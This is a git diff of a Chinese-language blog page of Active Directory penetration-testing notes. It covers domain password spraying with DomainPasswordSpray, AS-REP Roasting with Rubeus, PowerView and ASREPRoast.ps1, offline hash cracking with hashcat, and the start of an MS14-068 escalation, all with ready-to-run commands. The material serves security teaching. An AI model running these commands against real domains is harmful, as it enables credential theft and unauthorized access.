@@ -177,13 +177,14 @@
 <h4 id="1-枚举用户"><a href="#1-枚举用户" class="headerlink" title="1.枚举用户"></a>1.枚举用户</h4><p>在power shell中导入脚本:<code>Import-Module .\DomainPasswordSpray.ps1</code></p>
 <p>再执行以下内容进行用户名枚举</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt</span><br><span class="line">参数:Domain指定要测试的域名</span><br><span class="line">参数:RemoveDisabled尝试从用户列表删除禁用的账户</span><br><span class="line">参数:RemovePotentialLockouts删除锁定账户</span><br><span class="line">参数: UserList自定义用户列表(字典)。如果未指定，这将自动从域中获取5参数:Password指定单个密码进行口令测试</span><br><span class="line">参数:PasswordList指定一个密码字典</span><br><span class="line">参数:OutFile将结果保存到某个文件</span><br><span class="line">参数:Force当枚举出第一个后继续枚举，不询问</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210203004732222.png" alt="image-20210203004732222"></p>
 <p><img src="image-20210203004754984.png" alt="image-20210203004754984"></p>
 <h4 id="2-枚举密码"><a href="#2-枚举密码" class="headerlink" title="2.枚举密码"></a>2.枚举密码</h4><p>相当于指定密码进行爆破.</p>
-<p>执行以下命令进行密码枚举：<code>Invoke-DomainPasswordspray -Domain 域名 -Password 密码 ASD -OutFile pass.txt</code></p>
+<p>执行以下命令进行密码枚举：<code> Invoke-DomainPasswordspray -Domain 域名 -Password 密码 ASD -OutFile pass.txt</code></p>
 <p><img src="image-20210203004925060.png" alt="image-20210203004925060"></p>
 <h3 id="3-AS-REP-Roasting"><a href="#3-AS-REP-Roasting" class="headerlink" title="3.AS-REP-Roasting"></a>3.AS-REP-Roasting</h3><p><strong>原理</strong>AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “ 。而该属性默认是没有勾选上的。</p>
-<p>预身份验证是Kerberos身份验证的第一步(AS_REQ &amp; AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。关于 AS_REQ &amp; AS_REP：<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA%3D%3D&amp;chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&amp;idx=3&amp;mid=2247488900&amp;scene=21&amp;sn=dc2689efec7757f7b432e1fb38b599d4#wechat_redirect">域内认证之Kerberos协议详解。</a></p>
+<p>预身份验证是Kerberos身份验证的第一步(AS_REQ &amp; AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。关于 AS_REQ &amp; AS_REP：<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&idx=3&mid=2247488900&scene=21&sn=dc2689efec7757f7b432e1fb38b599d4#wechat_redirect">域内认证之Kerberos协议详解。</a></p>
 <p>当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。</p>
 <p><strong>攻击条件</strong></p>
 <ul>
@@ -198,25 +199,32 @@
 </li>
 </ul>
 </li>
-<li>需要一台可与KDC进行通信的主机/用户</li>
+<li>需要一台可与KDC进行通信的主机&#x2F;用户</li>
 </ul>
 <p><strong>攻击方式</strong></p>
 <p>1.linux下可以使用GetNPUsers.py这款工具进行破解.</p>
 <p>2.windows下使用Rubeus.exe进行破解(需要.net3.5)</p>
 <p>获得一个hashes.asreproast文件：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast</span><br></pre></td></tr></table></figure>
+
 <p>得到hashes.asreproast文件后可以使用hashcat或者john进行破解：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt</span><br></pre></td></tr></table></figure>
+
 <p>3.powershell</p>
 <p>工具</p>
 <p>powerview.ps1：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</a></p>
 <p>ASREPRoast.ps1：<a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a></p>
 <p>使用powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure>
+
 <p>使用ASREPRoast.ps1获取AS-REP返回的Hash</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName 用户名 -Domain 域名 | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
+
 <p>将hash.txt里面的除Hash字段其他的都删除，复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接。</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64<span class="selector-class">.exe</span> -m <span class="number">18200</span> hash<span class="selector-class">.txt</span> pass<span class="selector-class">.txt</span> <span class="attr">--force</span></span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="2-域内提权"><a href="#2-域内提权" class="headerlink" title="2.域内提权"></a>2.域内提权</h2><p>Ms14-086（支持到win2012,但是2012不稳定）</p>
 <p>通过是否打补丁(kb3011780)来判断是否存在漏洞</p>
 <p>生成一个文件ccache文件：<code>MS14-068.exe -u 用户名@域名 -p 明文密码 -s &lt;userSid&gt; -d 域控ip</code></p>
